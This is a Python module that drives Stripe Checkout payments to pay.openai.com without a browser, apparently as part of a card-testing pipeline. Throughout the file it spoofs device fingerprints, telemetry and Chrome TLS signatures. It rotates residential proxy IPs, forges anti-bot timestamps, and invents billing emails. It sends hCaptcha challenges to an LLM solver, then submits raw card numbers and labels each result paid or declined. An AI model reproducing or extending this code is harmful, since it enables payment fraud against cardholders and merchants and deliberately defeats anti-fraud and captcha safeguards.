"""Stripe Checkout 纯协议支付（无浏览器）。

完整链路：
  ① m.stripe.com/6 × 4        注册设备指纹 → guid/muid/sid
  ② payment_pages/{cs}/init   取 amount + link_settings{hcaptcha_site_key, rqdata}
  ③ elements/sessions         deferred_intent → config_id
  ④ payment_pages/{cs} × 6    逐字段 tax_region 提交
  ⑤ hCaptcha passive          解 sitekey + init rqdata
  ⑥ payment_methods           创建 pm_
  ⑦ confirm                   带 passive_captcha_token
     └─ 若触发 intent_confirmation_challenge：解第二次 → verify_challenge
  ⑧ poll                      终态

Stripe API 版本：2025-03-31.basil
"""
from __future__ import annotations

import base64
import hashlib
import json
import os
import random
import re
import string
import time
import uuid
from pathlib import Path
from dataclasses import dataclass, field
from typing import Any
from urllib.parse import urlencode

import httpx

try:
    from curl_cffi import requests as curl_requests
    _HAS_CURL_CFFI = True
except Exception:
    curl_requests = None
    _HAS_CURL_CFFI = False

STRIPE_API = "https://api.stripe.com"
V_FULL = "2025-03-31.basil; checkout_server_update_beta=v1; checkout_manual_approval_preview=v1"
V_BASE = "2025-03-31.basil"
V_HOSTED = "2020-08-27;custom_checkout_beta=v1"
V_ELEMENTS = "2026-03-25.dahlia"
#: 必须与 solver 浏览器、captcha.py 完全一致，否则 confirm 的 UA 与前一步
#: 签发 passive token 的 UA 不同，构成跨步骤的指纹矛盾。
UA = (
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/150.0.7871.128 Safari/537.36"
)
RUNTIME_HASH = "5412f474d5"
PUBLISHABLE_KEY = os.environ.get(
    "STRIPE_PUBLISHABLE_KEY",
    "pk_live_51HOrSwC6h1nxGoI3lTAgRjYVrz4dU3fVOabyCcKR3pbEJguCVAlqCxdxCUvoRh1XWwRacViovU3kLKvpkjh7IqkW00iXQsjo3n",
)
_DEFAULT_PROFILE = {
    "key": "linux",
    "build": "150.0.7871.128",
    "platform": "Linux x86_64",
    "label": "Linux",
    "screen": (1920, 1080, 1053),
    "cores": 8,
    "ua": ("Mozilla/5.0 (X11; Linux x86_64) "
           "AppleWebKit/537.36 (KHTML, like Gecko) "
           "Chrome/{build} Safari/537.36"),
    "hints": {"sec-ch-ua-platform": '"Linux"'},
}


STRIPE_HEADERS = {
    "User-Agent": UA,
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": "https://js.stripe.com",
    "Referer": "https://js.stripe.com/",
}

_PLUGINS = (
    "PDF Viewer,internal-pdf-viewer,application/pdf,pdf++text/pdf,pdf, "
    "Chrome PDF Viewer,internal-pdf-viewer,application/pdf,pdf++text/pdf,pdf, "
    "Chromium PDF Viewer,internal-pdf-viewer,application/pdf,pdf++text/pdf,pdf, "
    "Microsoft Edge PDF Viewer,internal-pdf-viewer,application/pdf,pdf++text/pdf,pdf, "
    "WebKit built-in PDF,internal-pdf-viewer,application/pdf,pdf++text/pdf,pdf"
)


def log(msg: str) -> None:
    print(time.strftime("%H:%M:%S"), msg, flush=True)


def _b64url(n: int = 32) -> str:
    return base64.urlsafe_b64encode(os.urandom(n)).rstrip(b"=").decode()


def _hex_id() -> str:
    """生成 Stripe 的 guid/muid/sid。

    真实格式：UUID（含连字符，36 字符）+ 6 位 hex = 42 字符
    例：08b021d6-5264-4aac-b928-8d571a3333c46da0e2
    """
    return str(uuid.uuid4()) + os.urandom(3).hex()


def _form(data: dict[str, Any]) -> str:
    return urlencode(
        [(k, str(v)) for k, v in data.items() if v is not None and v != ""]
    )


@dataclass
class Fingerprint:
    guid: str
    muid: str
    sid: str
    client_session_id: str = ""


@dataclass
class CheckoutContext:
    stripe_js_id: str
    init_checksum: str = ""
    config_id: str = ""
    amount: str = "0"
    return_url: str = ""
    site_key: str = ""
    rqdata: str = ""
    rv_timestamp: str = ""
    elements_session_id: str = ""


@dataclass
class PaymentOutcome:
    state: str = "unknown"
    code: str | None = None
    decline_code: str | None = None
    message: str | None = None
    intent_status: str | None = None
    charge_id: str | None = None
    payment_method_id: str | None = None
    raw: dict[str, Any] = field(default_factory=dict)

    @property
    def declined(self) -> bool:
        return self.state == "card_declined"

    @property
    def paid(self) -> bool:
        return self.state == "paid"


class StripeProtocol:
    """纯 HTTP 的 Stripe Checkout 支付客户端。"""

    def __init__(
        self,
        proxy: str | None = None,
        captcha_key: str = "",
        captcha_url: str = "https://api.yescaptcha.com",
        card: dict[str, str] | None = None,
        billing: dict[str, str] | None = None,
        timeout: float = 120.0,
        profile: dict | None = None,
    ) -> None:
        self.proxy = proxy or None
        self.locale = ""
        self.timezone = ""
        # 指纹必须与建单、求解器完全一致：由调用方传入同一份 profile
        self.profile = dict(profile or _DEFAULT_PROFILE)
        self.ua = self.profile["ua"].format(build=self.profile["build"])
        self.platform = self.profile["platform"]
        self.screen = tuple(self.profile["screen"])
        self.captcha_key = captcha_key
        self.captcha_url = captcha_url.rstrip("/")
        self.card = card or {}
        self.billing = billing or {}
        self.timeout = timeout
        self._client: httpx.Client | None = None
        self._geo: dict[str, str] = {}
        self.order_factory = None  # 可选：返回新 checkout_url 的 callable
        self._captcha_client: httpx.Client | None = None
        # solver 会话：passive 与 challenge 必须同一浏览器 + 同一出口 IP
        self._email_cache = ""
        # LLM 打码求解服务（tools/llm-solver/server.py）。
        # 给定时，命中 intent_confirmation_challenge 就去解，解出 token 继续 verify。
        self.challenge_solver_url = os.environ.get("GSS_LLM_SOLVER_URL", "").rstrip("/")
        # 由浏览器 Stripe 输入框产出的 pm_：给定时跳过服务端 tokenize。
        # 卡数据经过 Stripe iframe（真实用户路径），hCaptcha/Radar 判定更宽松。
        self.external_pm = ""

        # 步骤开关。默认全关 = 与 scripts/run_cards.py 完全一致的精简链路：
        #   init → payment_methods → confirm
        # 打开后逐项加回「更像真人」的环节，会影响耗时与风控判定。
        self.step_fingerprint = False   # m.stripe.com/6 × 4 + fetch_allowed_origins
        self.step_dwell = False         # init 后停留 10–16s
        self.step_elements = False      # elements/sessions
        self.step_tax_region = False    # 提交 tax_region[country]

    def rotate_proxy_sid(self) -> str:
        """更换代理的 sid，得到新的出口 IP。

        <PROXY_PROVIDER> 的 sid 会话会失效（表现为 SSL EOF），轮换可恢复。
        """
        if not self.proxy:
            return ""
        sid = "".join(
            __import__("secrets").choice(
                "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789")
            for _ in range(8)
        )
        self.proxy = re.sub(r"sid-[A-Za-z0-9]+", "sid-" + sid, self.proxy)
        log(f"   轮换代理 sid={sid}")
        return sid

    # ── HTTP ────────────────────────────────────────────────
    def _http(self):
        """返回一个会话；优先 curl_cffi（可模拟 Chrome 的 TLS/JA3 指纹）。"""
        if self._client is None:
            if _HAS_CURL_CFFI and curl_requests is not None:
                proxies = None
                if self.proxy:
                    proxies = {"http": self.proxy, "https": self.proxy}
                self._client = curl_requests.Session(
                    impersonate="chrome150",
                    proxies=proxies,
                    timeout=self.timeout,
                    headers={"Accept": "application/json"},
                )
                log("   使用 curl_cffi（Chrome TLS 指纹）")
            else:
                self._client = httpx.Client(
                    proxy=self.proxy, timeout=self.timeout,
                    headers={"User-Agent": self.ua, "Accept": "application/json"},
                )
                log("   使用 httpx（默认 TLS 指纹）")
        return self._client

    def close(self) -> None:
        for c in (self._client, self._captcha_client):
            if c is not None:
                try:
                    c.close()
                except Exception:
                    pass

    def __enter__(self) -> "StripeProtocol":
        return self

    def __exit__(self, *a: Any) -> None:
        self.close()


    # ── 请求封装（兼容 httpx 与 curl_cffi）──────────────────
    def _post(self, url: str, data: str, headers: dict[str, str]):
        c = self._http()
        if _HAS_CURL_CFFI and curl_requests is not None and hasattr(c, "post"):
            return c.post(url, data=data, headers=headers)
        return c.post(url, content=data, headers=headers)

    def _get(self, url: str, params: dict[str, Any], headers: dict[str, str]):
        c = self._http()
        return c.get(url, params=params, headers=headers)


    # ── 遥测上报（模拟 stripe.js 的 r.stripe.com/b）─────────
    def _telemetry(self, events: list[str], fp: Fingerprint, ctx: CheckoutContext) -> None:
        """按阶段上报事件，提升会话可信度。"""
        if not events:
            return
        headers = {
            "User-Agent": self.ua,
            "Content-Type": "text/plain;charset=UTF-8",
            "Accept": "*/*",
            "Origin": "https://js.stripe.com",
            "Referer": "https://js.stripe.com/",
        }
        for evt in events:
            payload = {
                "v2": 1, "tag": evt, "src": "js",
                "pid": "checkout_" + (ctx.config_id or "")[:20],
                "muid": fp.muid, "sid": fp.sid, "guid": fp.guid,
            }
            try:
                body = base64.b64encode(
                    json.dumps(payload, separators=(",", ":")).encode()
                ).decode()
                self._post("https://r.stripe.com/b", body, headers)
            except Exception:
                pass
            time.sleep(random.uniform(0.05, 0.2))

    # ── ① 指纹 ──────────────────────────────────────────────
    def register_fingerprint(self) -> Fingerprint:
        log("① m.stripe.com/6 注册指纹")
        guid, muid, sid = _hex_id(), _hex_id(), _hex_id()
        fp_id = os.urandom(16).hex()
        # 必须与 UA / profile 一致，否则 m.stripe.com 指纹与 UA 打架
        platform_str = self.platform
        locale = random.choice(["en-US", "en-US", "en-US", "en-GB"])
        sw, sh = self.screen[0], self.screen[1]
        dpr = 1
        vh = sh - random.randint(40, 70)
        cpu = random.choice([4, 8, 12, 16])

        def enc(obj: dict[str, Any]) -> str:
            raw = json.dumps(obj, separators=(",", ":"))
            return base64.b64encode(
                raw.encode().hex().encode()  # 占位，下面用正确实现
            ).decode()

        def encode_m6(obj: dict[str, Any]) -> str:
            raw = json.dumps(obj, separators=(",", ":"))
            quoted = "".join(
                c if c.isalnum() or c in "-_.~" else "%%%02X" % ord(c) for c in raw
            )
            return base64.b64encode(quoted.encode()).decode()

        def build_full(v2: int, with_ids: bool) -> dict[str, Any]:
            # 真实浏览器的 canvas 指纹是 49 位二进制串
            canvas_bits = "".join(random.choice("01") for _ in range(49))
            # webgl 指纹是 32 位 hex
            webgl_hex = os.urandom(16).hex()
            # 时区偏移，美国范围 -300 到 -480 分钟
            tz_offset = -random.choice([300, 360, 420, 480])
            return {
                "v2": v2, "id": fp_id,
                "t": round(random.uniform(140, 180), 1),
                "tag": "$npm_package_version", "src": "js",
                "a": {
                    "a": {"v": "true", "t": 0},
                    "b": {"v": "false", "t": 0},
                    "c": {"v": f"{locale},{locale.split('-')[0]}", "t": 0},
                    "d": {"v": platform_str, "t": 0},
                    "e": {"v": _PLUGINS, "t": round(random.uniform(0.3, 0.7), 1)},
                    "f": {"v": f"{sw}w_{sh}h_24d_{int(dpr) if dpr == int(dpr) else dpr}r", "t": 0},
                    "g": {"v": str(tz_offset), "t": 0},
                    "h": {"v": "false", "t": 0},
                    "i": {"v": "sessionStorage-enabled, localStorage-enabled",
                          "t": round(random.uniform(0.6, 1.0), 1)},
                    "j": {"v": canvas_bits, "t": round(random.uniform(150, 170), 1), "at": 4},
                    "k": {"v": "", "t": 0},
                    "l": {"v": self.ua, "t": 0},
                    "m": {"v": "", "t": round(random.uniform(0.05, 0.2), 1)},
                    "n": {"v": "false", "t": round(random.uniform(100, 130), 1), "at": 4},
                    "o": {"v": webgl_hex, "t": round(random.uniform(100, 120), 1)},
                },
                "b": {
                    "a": "",
                    "b": f"https://{_b64url(48)}.{_b64url(48)}",
                    "c": _b64url(32),
                    "d": muid if with_ids else "NA",
                    "e": sid if with_ids else "NA",
                    "f": False, "g": True, "h": True,
                    "i": ["location"], "j": [],
                    "n": round(random.uniform(800, 1000), 1),
                    "u": "pay.openai.com",
                    "v": "auth.openai.com",
                    "w": f"{int(time.time()*1000)}:{os.urandom(32).hex()}",
                },
                "h": os.urandom(10).hex(),
            }

        def build_mouse(source: str) -> dict[str, Any]:
            return {
                "muid": muid, "sid": sid,
                "url": f"https://{_b64url(8)}.{_b64url(8)}/{_b64url(8)}/{_b64url(8)}/{_b64url(8)}",
                "source": source,
                "data": [random.randint(1, 8) for _ in range(10)],
            }

        headers = {
            "User-Agent": self.ua,
            "Content-Type": "text/plain;charset=UTF-8",
            "Accept": "*/*",
            "Origin": "https://m.stripe.network",
            "Referer": "https://m.stripe.network/",
        }
        c = self._http()
        try:
            r = self._post("https://m.stripe.com/6", encode_m6(build_full(1, False)), headers)
            if r.status_code == 200:
                j = r.json()
                muid = j.get("muid") or muid
                guid = j.get("guid") or guid
                sid = j.get("sid") or sid
            r = self._post("https://m.stripe.com/6", encode_m6(build_full(2, True)), headers)
            if r.status_code == 200:
                guid = r.json().get("guid") or guid
            self._post("https://m.stripe.com/6", encode_m6(build_mouse("mouse-timings-10-v2")), headers)
            self._post("https://m.stripe.com/6", encode_m6(build_mouse("mouse-timings-10")), headers)
        except Exception as e:
            log(f"   指纹注册异常（用本地值）: {str(e)[:80]}")
        log(f"   guid={guid[:16]}")
        return Fingerprint(guid=guid, muid=muid, sid=sid,
                           client_session_id=str(uuid.uuid4()))

    def _fallback_email(self) -> str:
        """账单没填邮箱时的兜底。

        Stripe hosted checkout 的 confirm 必须有 email，
        否则 error.code=checkout_confirm_error、reason=checkout_email_missing。
        卡主真实邮箱由调用方传入；这里造一个与该账单姓名/地址一致的占位地址，
        避免整单因为少一个字段直接 400。
        """
        if self._email_cache:
            return self._email_cache
        name = (self.billing.get("name") or "cardholder").strip().lower()
        slug = re.sub(r"[^a-z0-9]+", ".", name).strip(".") or "cardholder"
        self._email_cache = f"{slug}.{os.urandom(3).hex()}@gmail.com"
        log(f"   账单缺邮箱，使用占位邮箱 {self._email_cache}")
        return self._email_cache

    @staticmethod
    def _make_rv_timestamp() -> str:
        """生成 Stripe 的 rv_timestamp。

        HAR 实测：长度固定 212，字符集只有 43 个
        （#$&;<=>?CDLMNOPQRTUXY[\\]^_`bdenoqrstuvwxyz{），
        不是全 ASCII。用相同字符集可避免被判定为伪造。
        """
        alphabet = "#$&;<=>?CDLMNOPQRTUXY[\\]^_`bdenoqrstuvwxyz{"
        return "".join(random.choice(alphabet) for _ in range(212))


    # 常用国家 → (locale, timezone)。代理是住宅池，同一 SID 也可能落到别的国家，
    # 若以 IP 地理为准，会出现「账单 US + 时区 America/Caracas」的矛盾组合，
    # Stripe 会据此加验证。所以 locale/时区一律以账单国家为准。
    _LOCALE_BY_COUNTRY = {
        "US": ("en-US", "America/New_York"),
        "CA": ("en-CA", "America/Toronto"),
        "GB": ("en-GB", "Europe/London"),
        "JP": ("ja-JP", "Asia/Tokyo"),
        "KR": ("ko-KR", "Asia/Seoul"),
        "SG": ("en-SG", "Asia/Singapore"),
        "AU": ("en-AU", "Australia/Sydney"),
        "DE": ("de-DE", "Europe/Berlin"),
        "FR": ("fr-FR", "Europe/Paris"),
        "NL": ("nl-NL", "Europe/Amsterdam"),
        "BR": ("pt-BR", "America/Sao_Paulo"),
        "MX": ("es-MX", "America/Mexico_City"),
        "CL": ("es-CL", "America/Santiago"),
        "TR": ("tr-TR", "Europe/Istanbul"),
        "IN": ("en-IN", "Asia/Kolkata"),
        "ID": ("id-ID", "Asia/Jakarta"),
        "VN": ("vi-VN", "Asia/Ho_Chi_Minh"),
        "TH": ("th-TH", "Asia/Bangkok"),
        "MY": ("ms-MY", "Asia/Kuala_Lumpur"),
        "PH": ("en-PH", "Asia/Manila"),
        "EG": ("en-EG", "Africa/Cairo"),
    }

    def _align_locale(self, proxy: str | None) -> tuple[str, str]:
        """返回 (locale, timezone)，以账单国家为准。

        只做一件事：查出口 IP 供日志留痕，并在出口国家与账单国家不一致时告警。
        locale/timezone 不再跟随 IP——住宅池会漂移，跟着漂会制造矛盾指纹。
        """
        country = (self.billing.get("country") or "US").upper()
        locale, tz = self._LOCALE_BY_COUNTRY.get(country, ("en-US", "America/New_York"))

        if not proxy:
            log(f"   无代理，locale={locale} tz={tz}（按账单国 {country}）")
            return locale, tz

        try:
            with httpx.Client(proxy=proxy, timeout=15) as c:
                r = c.get(
                    "http://ip-api.com/json/",
                    params={"fields": "status,countryCode,timezone,regionName"},
                )
                j = r.json()
                if j.get("status") == "success":
                    cc = (j.get("countryCode") or "").upper()
                    self._geo = {"country": cc, "timezone": j.get("timezone") or "",
                                 "region": j.get("regionName")}
                    if cc and cc != country:
                        log(f"   ⚠ 出口 {cc} ≠ 账单 {country}（locale 仍按账单国）")
                    else:
                        log(f"   出口 {cc} 与账单国一致，locale={locale} tz={tz}")
        except Exception as e:
            log(f"   出口地理查询失败（不影响流程）: {str(e)[:60]}")
        return locale, tz

    # ── ② init ──────────────────────────────────────────────
    def fetch_allowed_origins(self) -> dict[str, Any]:
        """真实浏览器在 init 前会先查 allowed_origins。

        必须用 Origin: https://js.stripe.com，否则 403。
        """
        r = self._get(
            f"{STRIPE_API}/v1/payment_pages/allowed_origins",
            {"key": PUBLISHABLE_KEY},
            {"Accept": "application/json",
             "Origin": "https://js.stripe.com",
             "Referer": "https://js.stripe.com/",
             "User-Agent": self.ua},
        )
        ok = r.status_code == 200
        log(f"   allowed_origins → {r.status_code}")
        return r.json() if ok else {}

    def init_checkout(self, cs_id: str) -> tuple[dict[str, Any], CheckoutContext]:
        log("② init")
        js_id = str(uuid.uuid4())
        locale, tz = self._align_locale(self.proxy)
        # 求解器必须复用同一组值（init 时已发给 Stripe）
        self.locale, self.timezone = locale, tz
        data = {
            "browser_locale": locale,
            "browser_timezone": tz,
            "eid": "NA",
            "key": PUBLISHABLE_KEY,
            "redirect_type": "url",
        }
        r = self._post(
            f"{STRIPE_API}/v1/payment_pages/{cs_id}/init",
            _form(data), STRIPE_HEADERS,
        )
        if r.status_code != 200:
            raise RuntimeError(f"init {r.status_code}: {r.text[:200]}")
        j = r.json()
        ls = j.get("link_settings") or {}
        due = (j.get("total_summary") or {}).get("due")
        ctx = CheckoutContext(
            stripe_js_id=js_id,
            init_checksum=j.get("init_checksum") or "",
            config_id=j.get("config_id") or "",
            amount=str(due) if due is not None else "0",
            return_url=j.get("url") or j.get("stripe_hosted_url") or "",
            site_key=ls.get("hcaptcha_site_key") or "",
            rqdata=ls.get("hcaptcha_rqdata") or "",
            rv_timestamp=self._make_rv_timestamp(),
        )
        log(f"   amount={ctx.amount} siteKey={ctx.site_key} rqdata={len(ctx.rqdata)}")
        log(f"   config_id={ctx.config_id[:12]}")
        return j, ctx

    # ── ③ elements/sessions ─────────────────────────────────
    def elements_session(self, cs_id: str, ctx: CheckoutContext,
                         locale: str = "en-US") -> dict[str, Any]:
        params = {
            "_stripe_version": V_ELEMENTS,
            "browser_timezone": self._geo.get("timezone", "America/New_York"),
            "checkout_session_id": cs_id,
            "client_betas[0]": "google_pay_beta_1",
            "client_betas[1]": "disable_deferred_intent_client_validation_beta_1",
            "client_betas[2]": "blocked_card_brands_beta_2",
            "currency": "usd",
            "deferred_intent[amount]": ctx.amount or "0",
            "deferred_intent[currency]": "usd",
            "deferred_intent[mode]": "subscription",
            "deferred_intent[payment_method_types][0]": "card",
            "deferred_intent[setup_future_usage]": "off_session",
            "elements_init_source": "checkout",
            "hosted_surface": "checkout",
            "key": PUBLISHABLE_KEY,
            "locale": locale,
            "referrer_host": "pay.openai.com",
            "stripe_js_id": ctx.stripe_js_id,
            "type": "deferred_intent",
        }
        r = self._get(f"{STRIPE_API}/v1/elements/sessions", params, STRIPE_HEADERS)
        if r.status_code == 200:
            j = r.json()
            sid = j.get("session_id") or j.get("id")
            if sid:
                ctx.elements_session_id = sid
                log(f"   elements_session_id={str(sid)[:24]}")
            if j.get("config_id"):
                ctx.config_id = j["config_id"]
                log(f"   config_id 更新为 {ctx.config_id[:12]}")
            return j
        log(f"   elements/sessions {r.status_code}: {r.text[:100]}")
        return {}

    # ── ④ 地址更新（真实浏览器只发 country）──────────────
    def update_address(self, cs_id: str, ctx: CheckoutContext) -> None:
        log("④ 提交 tax_region（country）")
        data = {
            "eid": "NA",
            "key": PUBLISHABLE_KEY,
            "tax_region[country]": self.billing.get("country", "US"),
        }
        r = self._post(f"{STRIPE_API}/v1/payment_pages/{cs_id}",
                       _form(data), STRIPE_HEADERS)
        log(f"   → {r.status_code}")
        if r.status_code == 200:
            try:
                body = r.json() or {}
                newest = body.get("config_id")
                if newest:
                    ctx.config_id = newest
                    log(f"   config_id 更新为 {ctx.config_id[:12]}")
                # 关键：提交 tax_region 后 Stripe 会按国家重算税额，总额可能变化。
                # confirm 的 expected_amount 必须等于会话当前总额，否则返回
                # checkout_amount_mismatch（CA/GB 等有消费税的国家必现）。
                due = (body.get("total_summary") or {}).get("due")
                if due is not None and str(due) != str(ctx.amount):
                    log(f"   金额随税额更新 {ctx.amount} → {due}")
                    ctx.amount = str(due)
            except Exception:
                pass
        else:
            log(f"   {r.text[:100]}")


    # 纯协议模式：不出浏览器、不调打码。
    # 遇到 intent_confirmation_challenge 直接判定为 challenge_required，
    # 由上层决定丢弃还是重跑。
    # （浏览器/打码求解器代码已移入 attic/browser-route-20261021/）

    def create_payment_method(
        self, cs_id: str, fp: Fingerprint, ctx: CheckoutContext
    ) -> str:
        log("⑥ payment_methods")
        card = self.card
        b = self.billing
        data = {
            "billing_details[name]": b.get("name", ""),
            # hosted checkout 的 confirm 会校验 email 是否已绑定到 PaymentMethod，
            # 缺了会返回 400 checkout_confirm_error / reason=checkout_email_missing。
            # email 只能挂在 billing_details 上，不能作为 confirm 的顶层参数。
            "billing_details[email]": (b.get("email") or "").strip() or self._fallback_email(),
            "billing_details[address][country]": b.get("country", "US"),
            "billing_details[address][line1]": b.get("line1", ""),
            "billing_details[address][city]": b.get("city", ""),
            "billing_details[address][postal_code]": (b.get("postal_code") or b.get("zip") or ""),
            "billing_details[address][state]": b.get("state", ""),
            "type": "card",
            "card[number]": card.get("number", ""),
            "card[cvc]": card.get("cvc", ""),
            "card[exp_year]": card.get("exp_year", ""),
            "card[exp_month]": card.get("exp_month", ""),
            "payment_user_agent": (
                f"stripe.js/{RUNTIME_HASH}; stripe-js-v3/{RUNTIME_HASH}; checkout"
            ),
            "client_attribution_metadata[client_session_id]": str(uuid.uuid4()),
            "client_attribution_metadata[checkout_session_id]": cs_id,
            "client_attribution_metadata[checkout_config_id]": ctx.config_id,
            "client_attribution_metadata[merchant_integration_source]": "checkout",
            "client_attribution_metadata[merchant_integration_version]": "hosted_checkout",
            "client_attribution_metadata[payment_method_selection_flow]": "merchant_specified",
            "guid": fp.guid, "muid": fp.muid, "sid": fp.sid,
            "key": PUBLISHABLE_KEY,
            "_stripe_version": V_HOSTED,
        }
        r = self._post(
            f"{STRIPE_API}/v1/payment_methods", _form(data),
            {**STRIPE_HEADERS, "Origin": "https://pay.openai.com",
             "Referer": "https://pay.openai.com/"})
        if r.status_code != 200:
            raise RuntimeError(f"payment_methods {r.status_code}: {r.text[:300]}")
        pm = r.json()
        c = pm.get("card") or {}
        log(f"   {pm['id']} ({c.get('display_brand')} ****{c.get('last4')})")
        return pm["id"]

    # ── ⑦ confirm（hosted_checkout 流，与真实用户一致）──────────
    def confirm(
        self, cs_id: str, pm_id: str, fp: Fingerprint,
        ctx: CheckoutContext, captcha: dict[str, str] | None,
    ) -> dict[str, Any]:
        log(f"⑦ confirm (hosted 流, config={ctx.config_id[:12]})")
        data = {
            "eid": "NA",
            "payment_method": pm_id,
            "expected_amount": ctx.amount,
            "consent[terms_of_service]": "accepted",
            "expected_payment_method_type": "card",
            "_stripe_version": V_HOSTED,
            "guid": fp.guid, "muid": fp.muid, "sid": fp.sid,
            "key": PUBLISHABLE_KEY,
            "link_brand": "link",
            "client_attribution_metadata[client_session_id]": fp.client_session_id,
            "client_attribution_metadata[checkout_session_id]": cs_id,
            "client_attribution_metadata[checkout_config_id]": ctx.config_id,
            "client_attribution_metadata[merchant_integration_source]": "checkout",
            "client_attribution_metadata[merchant_integration_version]": "hosted_checkout",
            "client_attribution_metadata[payment_method_selection_flow]": "merchant_specified",
            "client_attribution_metadata[checkout_config_id]": ctx.config_id,
        }
        if ctx.rv_timestamp:
            data["rv_timestamp"] = ctx.rv_timestamp
        if captcha and captcha.get("token"):
            data["passive_captcha_token"] = captcha["token"]
            # 真实浏览器总是发送 ekey，即便为空串
            data["passive_captcha_ekey"] = captcha.get("ekey", "")
        r = self._post(
            f"{STRIPE_API}/v1/payment_pages/{cs_id}/confirm", _form(data),
            {**STRIPE_HEADERS, "Origin": "https://pay.openai.com",
             "Referer": "https://pay.openai.com/"},
        )
        log(f"   → {r.status_code} ({len(r.text)} chars)")
        try:
            return {"status": r.status_code, "body": r.json()}
        except Exception:
            return {"status": r.status_code, "body": {"raw": r.text[:800]}}

    # ── ⑦c verify_challenge ────────────────────────────────
    def _solve_challenge(self, site_key: str, rqdata: str) -> dict[str, Any] | None:
        """调 LLM 打码服务，在「同一出口」的浏览器里把挑战答出来。

        返回 {"token": str} 或 None。服务不可用时返回 None，调用方照旧放弃。
        """
        if not self.challenge_solver_url or not site_key:
            return None
        try:
            # 指纹必须与协议链一致：同一出口 + 同一 UA / 平台 / 屏幕
            _ua = self.ua
            _plat, _label = self.platform, self.profile.get("label", "Linux")
            _scr = self.screen
            payload = {
                "sitekey": site_key,
                "rqdata": rqdata,
                "proxy": self.proxy or "",
                "host": "b.stripecdn.com",
                "ua": _ua,
                "platform": _plat,
                "platform_label": _label,
                "screen_w": _scr[0],
                "screen_h": _scr[1],
                "avail_h": _scr[2],
                "cores": 8,
                "locale": getattr(self, "locale", "en-US"),
                "timezone": getattr(self, "timezone", "America/New_York"),
            }
            r = httpx.post(
                f"{self.challenge_solver_url}/solve", json=payload,
                timeout=httpx.Timeout(420.0, connect=15.0),
            )
            data: dict[str, Any] = {}
            try:
                data = r.json() or {}
            except Exception:
                data = {}
            tok = str(data.get("token") or "")
            if r.status_code == 200 and tok:
                return {"token": tok, "ekey": ""}
            log(f"   求解服务未通过：{data.get('error') or r.status_code} "
                f"{str(data.get('rounds'))[:160]}")
        except Exception as exc:  # noqa: BLE001
            log(f"   求解服务异常：{str(exc)[:120]}")
        return None

    def verify_challenge(
        self, path: str, token: str, client_secret: str, ekey: str = ""
    ) -> dict[str, Any]:
        log("⑦c verify_challenge")
        data = {
            "client_secret": client_secret,
            "challenge_response_token": token,
            "captcha_vendor_name": "hcaptcha",
            "key": PUBLISHABLE_KEY,
            # 挑战来自 hosted checkout（payment_pages/{cs}/confirm），
            # 版本必须和该流程一致；用 V_FULL 会让 token 被判无效。
            "_stripe_version": V_HOSTED,
        }
        # 真实浏览器把 hCaptcha 的 ekey 一起回传；有就必须带上
        if ekey:
            data["captcha_response_key"] = ekey
        path = path if path.startswith("/") else "/" + path
        r = self._post(f"{STRIPE_API}{path}", _form(data), STRIPE_HEADERS)
        log(f"   → {r.status_code} ({len(r.text)} chars)")
        try:
            return {"status": r.status_code, "body": r.json()}
        except Exception:
            return {"status": r.status_code, "body": {"raw": r.text[:800]}}

    # ── ⑧ poll ─────────────────────────────────────────────
    def poll(self, cs_id: str, tries: int = 15) -> dict[str, Any]:
        log("⑧ poll")
        last: dict[str, Any] = {}
        for i in range(tries):
            time.sleep(2)
            r = self._get(
                f"{STRIPE_API}/v1/payment_pages/{cs_id}/poll",
                {"key": PUBLISHABLE_KEY, "_stripe_version": V_BASE},
                STRIPE_HEADERS,
            )
            try:
                last = r.json()
            except Exception:
                last = {"raw": r.text[:300]}
            state = last.get("state") or last.get("payment_object_status")
            log(f"   [{i+1}] state={state} payment={last.get('payment_object_status')}")
            if str(state) in ("succeeded", "failed", "expired", "canceled"):
                break
        return last

    # ── 判定 ───────────────────────────────────────────────
    @staticmethod
    def classify(confirm: dict[str, Any], poll: dict[str, Any] | None) -> PaymentOutcome:
        out = PaymentOutcome()

        def scan(obj: Any) -> None:
            if not isinstance(obj, dict):
                return
            # verify_challenge / confirm 可能把 last_payment_error 放在顶层
            top_err = obj.get("last_payment_error") or obj.get("last_setup_error") or {}
            if top_err and isinstance(top_err, dict):
                out.code = out.code or top_err.get("code")
                out.decline_code = out.decline_code or top_err.get("decline_code")
                out.message = out.message or str(top_err.get("message") or "")[:200]
                if top_err.get("charge"):
                    out.charge_id = out.charge_id or top_err["charge"]
                tmpp = top_err.get("payment_method") or {}
                if tmpp.get("id"):
                    out.payment_method_id = out.payment_method_id or tmpp["id"]
            if obj.get("status") and not out.intent_status:
                out.intent_status = obj["status"]
            for holder in ("payment_intent", "setup_intent"):
                sub = obj.get(holder)
                if isinstance(sub, dict):
                    if sub.get("status"):
                        out.intent_status = sub["status"]
                    err = sub.get("last_payment_error") or sub.get("last_setup_error") or {}
                    if err:
                        out.code = err.get("code") or out.code
                        out.decline_code = err.get("decline_code") or out.decline_code
                        out.message = (err.get("message") or out.message or "")[:200]
                        if err.get("charge"):
                            out.charge_id = err["charge"]
                        pm = err.get("payment_method") or {}
                        if pm.get("id"):
                            out.payment_method_id = pm["id"]
            err = obj.get("error")
            if isinstance(err, dict):
                out.code = out.code or err.get("code")
                out.decline_code = out.decline_code or err.get("decline_code")
                out.message = out.message or str(err.get("message") or "")[:200]
                if err.get("charge"):
                    out.charge_id = out.charge_id or err["charge"]
                pm = err.get("payment_method") or {}
                if pm.get("id"):
                    out.payment_method_id = out.payment_method_id or pm["id"]

        scan(confirm.get("body") if confirm else None)
        scan(poll)

        status = (out.intent_status or "").lower()
        # confirm 阶段的参数级错误（缺邮箱、config 过期等）不是拒卡，
        # 单列一个 state，否则会被误当成「已到发卡行」。
        confirm_status = int((confirm or {}).get("status") or 0)
        if status in ("succeeded", "requires_capture"):
            out.state = "paid"
        elif out.code == "checkout_confirm_error" or confirm_status == 400:
            out.state = "confirm_error"
        elif out.decline_code or out.code:
            if "captcha" in (out.message or "").lower():
                out.state = "captcha_rejected"
            else:
                out.state = "card_declined"
        elif status == "requires_action":
            out.state = "challenge_required"
        elif (poll or {}).get("state") in ("failed",):
            out.state = "card_declined"
        elif (poll or {}).get("state") == "succeeded":
            out.state = "paid"
        out.raw = {"confirm": confirm, "poll": poll}
        return out

    # ── 主流程 ─────────────────────────────────────────────
